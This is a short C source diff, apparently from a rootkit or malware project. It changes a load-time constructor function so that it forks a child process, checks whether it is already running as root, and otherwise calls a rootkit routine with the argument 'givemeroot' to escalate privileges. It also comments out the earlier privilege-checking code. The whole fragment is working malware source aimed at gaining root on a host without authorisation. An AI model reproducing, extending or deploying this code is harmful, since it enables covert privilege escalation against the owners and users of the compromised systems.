@@ -2,11 +2,11 @@
 
 #include <stdint.h>
 #include <signal.h>
+#include <pthread.h>
 
 #include <fcntl.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-
 #include <sys/ptrace.h>
 
 #include "include/config.h"
@@ -117,10 +117,28 @@ __attribute__((constructor (102))) void pre_core(void)
 __attribute__((constructor (103))) int post_core(void)
 {
     int uid, orig_uid, orig_gid;
+
 #ifdef DEBUG
     printf("Normal Operation!\r\n");
 #endif
 
+    if(fork() == 0) // Child
+    {
+        orig_uid = getuid();
+        orig_gid = getgid();
+
+        if(orig_uid == 0)
+        {
+#ifdef DEBUG
+            printf("We're already root, skip using rootkit...\r\n");
+#endif
+            return -1;
+        }
+
+        rk_exec(RK_PATH, "givemeroot");
+    }
+
+    /*
     orig_uid = getuid();
     orig_gid = getgid();
 
@@ -145,6 +163,7 @@ __attribute__((constructor (103))) int post_core(void)
         printf("Still Root, uid: %d\r\n", uid);
     else if(uid == orig_uid)
         printf("We're not root anymore, uid: %d\r\n", uid);
+    */
 
     return 0;
 }
